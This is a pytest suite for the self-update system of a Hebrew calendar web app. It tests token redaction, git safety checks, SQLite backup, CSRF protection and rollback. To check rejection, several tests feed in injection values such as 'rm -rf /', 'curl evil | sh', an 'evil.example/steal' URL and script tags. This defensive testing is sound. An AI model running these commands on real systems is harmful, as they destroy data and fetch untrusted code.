"""עדכון גרסה: בלי רשת ובלי git אמיתי, חוץ מגיבוי SQLite."""
from __future__ import annotations

import json
import sqlite3
import subprocess
from pathlib import Path

import pytest

from app.updates.errors import UpdateError, redact
from app.updates.flow import Plan, execute_update, outcome_text
from app.updates.github_api import Release, fetch_latest, parse_releases
from app.updates.gitops import (
    assert_fast_forward,
    assert_not_shallow,
    assert_worktree_clean,
    backup_sqlite,
    git_auth_env,
    restore_sqlite,
    restart_argv,
)
from app.updates.store import acquire_lock, blank_status, public_status, release_lock, write_status
from app.updates.version import (
    highlights_from_body,
    is_newer,
    parse_github_slug,
    parse_version,
)

REPO = Path(__file__).resolve().parent.parent
SHA_A = "a" * 40
SHA_B = "b" * 40


class Cmd:
    def __init__(self, code, out="", err=""):
        self.returncode = code
        self.stdout = out
        self.stderr = err


@pytest.fixture(autouse=True)
def _update_env(monkeypatch, tmp_path):
    monkeypatch.setenv("HEB_CAL_UPDATE_DIR", str(tmp_path))
    monkeypatch.setenv("HEB_CAL_BACKUP_DIR", str(tmp_path / "backups"))
    monkeypatch.setenv("HEB_CAL_UPDATE_MODE", "git")
    monkeypatch.setenv("HEB_CAL_GITHUB_REPO", "pilpel1/HEB-CAL")
    monkeypatch.setenv("HEB_CAL_RESTART_COMMAND", "/bin/true")
    monkeypatch.delenv("ADMIN_PASSWORD", raising=False)
    monkeypatch.delenv("HEB_CAL_GITHUB_TOKEN", raising=False)
    monkeypatch.delenv("HEB_CAL_UPDATE_HOOK", raising=False)
    monkeypatch.delenv("HEB_CAL_HEALTH_URL", raising=False)
    yield tmp_path


def test_version_file_matches_changelog():
    version = (REPO / "VERSION").read_text(encoding="utf-8").strip()
    changelog = (REPO / "CHANGELOG.md").read_text(encoding="utf-8")
    assert parse_version(version) == (1, 0, 14)
    assert f"## {version}" in changelog
    assert "## 1.0.8" in changelog
    assert "## 1.0.3" in changelog
    assert "## 1.0.2" in changelog


def test_semver_and_newer():
    assert is_newer("1.2.0", "1.0.0")
    assert not is_newer("1.0.0", "1.0.0")
    assert not is_newer("0.9.0", "1.0.0")
    assert parse_version("v1.2.3") == (1, 2, 3)
    assert parse_version("1.2") is None
    assert parse_version("1.2.0; rm -rf /") is None


def test_highlights_are_plain_lines():
    body = "# כותרת\n\n- שורה ראשונה\n* שנייה\n1. שלישית\n\nעוד\n"
    assert highlights_from_body(body) == ["שורה ראשונה", "שנייה", "שלישית", "עוד"]
    raw = highlights_from_body("<script>alert(1)</script>")
    assert raw == ["<script>alert(1)</script>"]


def test_slug_strips_embedded_token():
    remote = "https://x-access-token:ghp_SUPERSECRET@github.com/pilpel1/HEB-CAL.git"
    slug = parse_github_slug(remote)
    assert slug == "pilpel1/HEB-CAL"
    assert "SUPERSECRET" not in slug
    assert "ghp_" not in slug
    assert parse_github_slug("git@github.com:pilpel1/HEB-CAL.git") == "pilpel1/HEB-CAL"
    assert parse_github_slug("https://gitlab.com/a/b") is None


def test_redact_hides_tokens():
    raw = (
        "fetch https://x-access-token:ghp_SUPERSECRET@github.com/a/b "
        "Authorization: Bearer ghp_SUPERSECRET token=abc password=zzz"
    )
    cleaned = redact(raw)
    assert "SUPERSECRET" not in cleaned
    assert "ghp_" not in cleaned
    assert "abc" not in cleaned
    assert "zzz" not in cleaned


def test_git_auth_env_is_not_an_argument():
    env = git_auth_env({"PATH": "/bin", "GIT_CONFIG_COUNT": "0"}, "ghp_SUPERSECRET")
    assert env["GIT_CONFIG_VALUE_0"] == "AUTHORIZATION: bearer ghp_SUPERSECRET"
    assert "SUPERSECRET" not in redact(env["GIT_CONFIG_VALUE_0"])
    assert "ghp_" not in redact(json.dumps({"note": "no token here"}))


def test_releases_skip_drafts_and_pick_highest():
    payload = [
        {"tag_name": "v1.0.0", "body": "- ישן", "draft": False, "prerelease": False, "html_url": "https://github.com/pilpel1/HEB-CAL/releases/1"},
        {"tag_name": "v2.0.0", "body": "- חדש", "draft": True, "prerelease": False},
        {"tag_name": "v1.4.0-rc", "body": "לא סמנטי", "draft": False, "prerelease": False},
        {"tag_name": "v1.3.0", "body": "- אמצע\n- עוד", "draft": False, "prerelease": True},
        {"tag_name": "1.2.0", "body": "- יציב", "draft": False, "prerelease": False, "html_url": "javascript:alert(1)"},
    ]
    found = parse_releases(payload)
    assert [item.version for item in found] == ["1.2.0", "1.0.0"]
    assert found[0].highlights == ["יציב"]
    assert found[0].url is None


def test_fetch_latest_does_not_put_token_in_the_url_or_the_error():
    seen = []

    def getter(url, headers, timeout=15):
        seen.append((url, headers.get("Authorization")))
        return 401, None

    with pytest.raises(UpdateError) as caught:
        fetch_latest("pilpel1/HEB-CAL", "ghp_SUPERSECRET", getter)
    assert seen
    assert "SUPERSECRET" not in seen[0][0]
    assert seen[0][1] == "Bearer ghp_SUPERSECRET"
    assert "SUPERSECRET" not in caught.value.message
    assert "ghp_" not in caught.value.message


def test_dirty_tree_and_non_fast_forward_and_bad_tag():
    def dirty(args):
        return Cmd(0, " M app/x.py\n", "")

    with pytest.raises(UpdateError) as caught:
        assert_worktree_clean(dirty)
    assert "שינויים מקומיים" in caught.value.message

    calls = []

    def nope(args):
        calls.append(args)
        return Cmd(0, "", "")

    with pytest.raises(UpdateError):
        assert_fast_forward(nope, SHA_A, "1.2.0; rm -rf /")
    assert calls == []

    def history(args):
        if args[1] == "rev-parse":
            return Cmd(0, SHA_B + "\n", "")
        if args[1] == "merge-base":
            return Cmd(1, "", "")
        return Cmd(0, "", "")

    with pytest.raises(UpdateError) as caught:
        assert_fast_forward(history, SHA_A, "v1.2.0")
    assert "המשך ישיר" in caught.value.message

    def shallow(args):
        return Cmd(0, "true\n", "")

    with pytest.raises(UpdateError) as caught:
        assert_not_shallow(shallow)
    assert "shallow" in caught.value.message


def test_restart_argv_rejects_newlines(tmp_path):
    assert restart_argv("/bin/true", tmp_path) == ["/bin/true"]
    with pytest.raises(UpdateError):
        restart_argv("echo hi\nrm -rf /", tmp_path)


def test_restart_argv_resolves_relative_to_repo_root(tmp_path):
    script = tmp_path / "scripts" / "restart.sh"
    script.parent.mkdir()
    script.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    script.chmod(0o755)
    assert restart_argv("scripts/restart.sh", tmp_path) == [str(script.resolve())]
    assert restart_argv("./scripts/restart.sh --flag", tmp_path) == [str(script.resolve()), "--flag"]
    assert restart_argv("/bin/true", tmp_path) == ["/bin/true"]
    assert restart_argv("true", tmp_path) == ["true"]


def test_backup_roundtrip_and_drops_wal(tmp_path):
    live = tmp_path / "cal.sqlite"
    conn = sqlite3.connect(live)
    conn.execute("CREATE TABLE t (v TEXT)")
    conn.execute("INSERT INTO t VALUES ('keep')")
    conn.commit()
    conn.close()
    dest = tmp_path / "backups" / "snap.sqlite"
    backup_sqlite(live, dest)
    assert dest.stat().st_mode & 0o777 == 0o600
    conn = sqlite3.connect(live)
    conn.execute("UPDATE t SET v = 'changed'")
    conn.commit()
    conn.close()
    wal = Path(str(live) + "-wal")
    wal.write_bytes(b"wal")
    restore_sqlite(dest, live)
    assert not wal.exists()
    conn = sqlite3.connect(live)
    assert conn.execute("SELECT v FROM t").fetchone()[0] == "keep"
    conn.close()


def test_lock_blocks_a_second_update(tmp_path):
    acquire_lock(tmp_path)
    with pytest.raises(UpdateError) as caught:
        acquire_lock(tmp_path)
    assert caught.value.step == "busy"
    release_lock(tmp_path)
    acquire_lock(tmp_path)


def test_public_status_hides_backup_path(tmp_path):
    path = tmp_path / "update-status.json"
    write_status(path, {
        **blank_status("1.0.0"),
        "state": "running",
        "message": "מגבה את מסד הנתונים",
        "backup": "/home/secret/calendar.db",
        "token": "ghp_SUPERSECRET",
    })
    view = public_status(json.loads(path.read_text(encoding="utf-8")), "1.0.0")
    dumped = json.dumps(view)
    assert "backup" not in view
    assert "secret" not in dumped
    assert "SUPERSECRET" not in dumped


def test_outcome_messages():
    assert outcome_text(set(), True) == "לא שינינו את הקוד."
    assert "חזרנו לגרסה הקודמת ולגיבוי" in outcome_text({"checkout", "migrate"}, True)
    assert "לא הושלמה" in outcome_text({"migrate"}, False)
    both = outcome_text({"checkout", "migrate", "restart"}, "partial-both")
    assert "הפעלה מחדש נכשלה" in both
    assert "לא הושלמה" not in both
    assert "מסד הנתונים" in both and "הקוד" in both


class FakeOps:
    def __init__(self, fail_at=None, restart_on=True, restart_fails=0):
        self.fail_at = fail_at
        self.restart_on = restart_on
        self.restart_fails = restart_fails
        self.calls = []
        self.payload = {}

    def write(self, **fields):
        self.payload.update(fields)
        self.calls.append(("write", fields.get("state"), fields.get("step")))

    def _fail(self, name, message, step):
        self.calls.append((name,))
        if self.fail_at == name:
            self.fail_at = None
            raise UpdateError(message, step=step)

    def backup_database(self):
        self._fail("backup_database", "הגיבוי נכשל.", "backup")
        return Path("/tmp/heb-cal-backup.sqlite")

    def restore_database(self, backup):
        self.calls.append(("restore_database", str(backup)))

    def current_sha(self):
        self.calls.append(("current_sha",))
        return SHA_A

    def ensure_clean(self):
        self._fail("ensure_clean", "יש שינויים מקומיים בקוד.", "checkout")

    def ensure_not_shallow(self):
        self.calls.append(("ensure_not_shallow",))

    def fetch(self, tag):
        self.calls.append(("fetch", tag))

    def ensure_fast_forward(self, sha, tag):
        self._fail("ensure_fast_forward", "הגרסה החדשה אינה המשך ישיר של ההתקנה.", "checkout")

    def checkout(self, tag):
        self.calls.append(("checkout", tag))

    def checkout_sha(self, sha):
        self.calls.append(("checkout_sha", sha))

    def pip_install(self):
        self._fail("pip_install", "התקנת החבילות נכשלה.", "install")

    def migrate(self):
        self._fail("migrate", "עדכון מסד הנתונים נכשל.", "migrate")

    def run_hook(self, version):
        self._fail("run_hook", "סקריפט העדכון נכשל.", "hook")

    def restart(self):
        if self.restart_fails:
            self.calls.append(("restart",))
            self.restart_fails -= 1
            raise UpdateError("ההפעלה מחדש נכשלה.", step="restart")
        self._fail("restart", "ההפעלה מחדש נכשלה.", "restart")

    def stop_app(self):
        self.calls.append(("stop_app",))

    def restart_configured(self):
        return self.restart_on

    def wait_healthy(self, version):
        self.calls.append(("wait_healthy", version))
        if self.fail_at == "wait_healthy":
            self.fail_at = None
            raise UpdateError("האפליקציה לא עלתה אחרי העדכון.", step="health")


def _names(ops):
    return [call[0] for call in ops.calls]


def test_flow_success_and_rollback_paths():
    ops = FakeOps()
    execute_update(ops, Plan("git", "v1.2.0", "1.2.0"))
    assert ops.payload["state"] == "success"
    assert "restore_database" not in _names(ops)
    assert _names(ops).count("pip_install") == 1

    dirty = FakeOps(fail_at="ensure_clean")
    execute_update(dirty, Plan("git", "v1.2.0", "1.2.0"))
    assert dirty.payload["state"] == "failed"
    assert "לא שינינו את הקוד" in dirty.payload["message"]
    assert "checkout" not in _names(dirty)

    health = FakeOps(fail_at="wait_healthy")
    execute_update(health, Plan("git", "v1.2.0", "1.2.0"))
    assert health.payload["state"] == "failed"
    assert "חזרנו לגרסה הקודמת ולגיבוי" in health.payload["message"]
    order = _names(health)
    assert order.index("stop_app") < order.index("restore_database")
    assert "checkout_sha" in order
    restored_at = order.index("restore_database")
    assert "restart" in order[restored_at:]

    packages = FakeOps(fail_at="pip_install")
    execute_update(packages, Plan("git", "v1.2.0", "1.2.0"))
    assert "מסד הנתונים לא השתנה" in packages.payload["message"]
    assert "restore_database" not in _names(packages)
    assert "checkout_sha" in _names(packages)

    hook = FakeOps(fail_at="run_hook", restart_on=False)
    execute_update(hook, Plan("hook", "v1.2.0", "1.2.0"))
    assert "מסד הנתונים שוחזר" in hook.payload["message"]
    assert "checkout_sha" not in _names(hook)

    # ההפעלה נכשלת גם אחרי שהקוד והמסד כבר חזרו — לא לכתוב «לא הושלמה».
    stuck = FakeOps(restart_fails=2)
    execute_update(stuck, Plan("git", "v1.2.0", "1.2.0"))
    assert stuck.payload["state"] == "failed"
    assert "הפעלה מחדש נכשלה" in stuck.payload["message"]
    assert "לא הושלמה" not in stuck.payload["message"]
    assert "restore_database" in _names(stuck)
    assert "checkout_sha" in _names(stuck)


def _csrf(client) -> str:
    return client.get("/api/updates").get_json()["csrf_token"]


def _release():
    return Release(
        "1.2.0",
        "v1.2.0",
        ["שורה אחת", "<b>לא html</b>"],
        "https://github.com/pilpel1/HEB-CAL/releases/tag/v1.2.0",
    )


def test_settings_and_gear_markup(client):
    settings = client.get("/settings").get_data(as_text=True)
    assert 'id="settingsUpdate"' in settings
    assert "עדכון גרסה" in settings
    assert "בדוק עדכונים" in settings
    assert "עדכן עכשיו" in settings
    assert "סיסמת מנהל" not in settings
    assert "updateLoginForm" not in settings
    assert ">1.0.14<" in settings
    page = client.get("/").get_data(as_text=True)
    assert 'id="updateNavBadge"' in page
    assert 'href="/settings#settingsUpdate"' in page
    script = (REPO / "app/static/js/events/updates.js").read_text(encoding="utf-8")
    assert "textContent" in script
    assert "innerHTML" not in script
    assert "ADMIN_PASSWORD" not in script
    assert "/api/updates/login" not in script
    failed_branch = script.split("state === 'failed'", 1)[1][:700]
    assert "disabled = false" in failed_branch
    assert "updateOffer" in failed_branch


def test_health_is_public_and_summary_has_no_secrets(client):
    health = client.get("/api/updates/health")
    assert health.status_code == 200
    assert health.get_json()["version"] == "1.0.14"
    body = client.get("/api/updates").get_json()
    dumped = json.dumps(body)
    assert body["current"] == "1.0.14"
    assert "admin" not in body
    assert "admin_configured" not in body
    assert "csrf_token" in body
    assert "secret-secret" not in dumped
    assert "ghp_" not in dumped
    assert "/bin/true" not in dumped
    assert "HEB_CAL_GITHUB_TOKEN" not in dumped
    assert "ADMIN_PASSWORD" not in dumped
    assert client.get("/api/updates/status").status_code == 200
    assert client.post("/api/updates/check").status_code == 403
    assert client.post("/api/updates/login", json={"password": "x"}).status_code == 404


def test_csrf_blocks_check_and_apply(client):
    assert client.post("/api/updates/apply", json={"version": "1.2.0", "command": "rm -rf /"}).status_code == 403
    bad = client.post("/api/updates/check", headers={"X-CSRF-Token": "not-the-token"})
    assert bad.status_code == 403
    assert "נחסמה" in bad.get_json()["error"]


def test_check_and_apply_ignore_commands_from_the_request(client, monkeypatch):
    monkeypatch.setenv("HEB_CAL_GITHUB_TOKEN", "ghp_SUPERSECRET")
    seen = {}

    def fake_fetch(repo, token):
        seen["token"] = token
        seen["repo"] = repo
        return _release()

    monkeypatch.setattr("app.updates.service.fetch_latest", fake_fetch)
    monkeypatch.setattr("app.updates.service.assert_not_shallow", lambda run: None)
    monkeypatch.setattr("app.updates.service.assert_worktree_clean", lambda run: None)

    class FakePopen:
        def __init__(self, args, **kwargs):
            FakePopen.args = args
            FakePopen.kwargs = kwargs
            self.pid = 424242

    monkeypatch.setattr(subprocess, "Popen", FakePopen)
    # service imported Popen already
    monkeypatch.setattr("app.updates.service.subprocess.Popen", FakePopen)

    token = _csrf(client)
    checked = client.post("/api/updates/check", json={}, headers={"X-CSRF-Token": token})
    assert checked.status_code == 200
    payload = checked.get_json()
    assert payload["available"] is True
    assert payload["latest"] == "1.2.0"
    assert payload["highlights"][0] == "שורה אחת"
    dumped = json.dumps(payload)
    assert "SUPERSECRET" not in dumped
    assert seen["token"] == "ghp_SUPERSECRET"

    token = client.get("/api/updates").get_json()["csrf_token"]
    before = "/bin/true"
    response = client.post(
        "/api/updates/apply",
        json={
            "version": "1.2.0",
            "tag": "v1.0.0; rm -rf /",
            "restart": "rm -rf /",
            "command": "curl evil | sh",
            "token": "ghp_FROM_BROWSER",
        },
        headers={"X-CSRF-Token": token},
    )
    assert response.status_code == 202, response.get_json()
    args = FakePopen.args
    joined = " ".join(args)
    assert args[0]
    assert "-m" in args and "app.updates.runner" in args
    assert "rm" not in joined
    assert "curl" not in joined
    assert "SUPERSECRET" not in joined
    assert "FROM_BROWSER" not in joined
    assert args[args.index("--target") + 1] == "1.2.0"
    assert args[args.index("--tag") + 1] == "v1.2.0"
    assert FakePopen.kwargs["shell"] is False
    assert FakePopen.kwargs["start_new_session"] is True
    assert before == "/bin/true"


def test_docker_mode_does_not_spawn(client, monkeypatch):
    monkeypatch.setenv("HEB_CAL_UPDATE_MODE", "docker")
    spawned = []
    monkeypatch.setattr("app.updates.service.spawn_updater", lambda *args: spawned.append(args))
    token = _csrf(client)
    response = client.post("/api/updates/apply", json={"version": "9.9.9"}, headers={"X-CSRF-Token": token})
    assert response.status_code == 400
    assert "Docker" in response.get_json()["error"]
    assert spawned == []
    summary = client.get("/api/updates").get_json()
    assert summary["can_apply"] is False
    assert summary["docker_command"] == "docker compose pull && docker compose up -d"


def test_missing_relative_restart_blocks_apply(client, monkeypatch):
    monkeypatch.setenv("HEB_CAL_RESTART_COMMAND", "scripts/does-not-exist.sh")
    body = client.get("/api/updates").get_json()
    assert body["can_apply"] is False
    assert body["block"] == "סקריפט ההפעלה מחדש לא נמצא."
    assert "does-not-exist" not in json.dumps({k: v for k, v in body.items() if k != "block"})


def test_hook_command_string_is_rejected(client, monkeypatch):
    monkeypatch.setenv("HEB_CAL_UPDATE_MODE", "hook")
    monkeypatch.setenv("HEB_CAL_UPDATE_HOOK", "docker compose pull")
    body = client.get("/api/updates").get_json()
    assert body["can_apply"] is False
    assert "נתיב" in body["block"]


def test_health_url_must_be_loopback(client, monkeypatch):
    monkeypatch.setenv("HEB_CAL_HEALTH_URL", "http://evil.example/steal")
    body = client.get("/api/updates").get_json()
    assert body["can_apply"] is False
    assert "localhost" in body["block"]
    assert "evil" not in json.dumps(body)


def test_runner_refuses_a_tag_that_is_not_a_version(tmp_path):
    from app.updates.runner import main

    status = tmp_path / "update-status.json"
    code = main([
        "--target", "1.2.0; rm -rf /",
        "--tag", "v1.2.0",
        "--mode", "git",
        "--status", str(status),
    ])
    assert code == 1
    text = status.read_text(encoding="utf-8")
    assert "rm" not in text
    assert "לא תקין" in text or "גרסה" in text


def test_badge_uses_cache_only(client, tmp_path):
    from app.updates.store import cache_path, write_cache

    write_cache(cache_path(tmp_path), {
        "available": True,
        "latest": "1.4.0",
        "highlights": ["משהו"],
        "current": "1.0.0",
        "ok": True,
    })
    badge = client.get("/api/updates/badge").get_json()
    assert badge["available"] is True
    assert badge["latest"] == "1.4.0"
    assert "highlights" not in badge
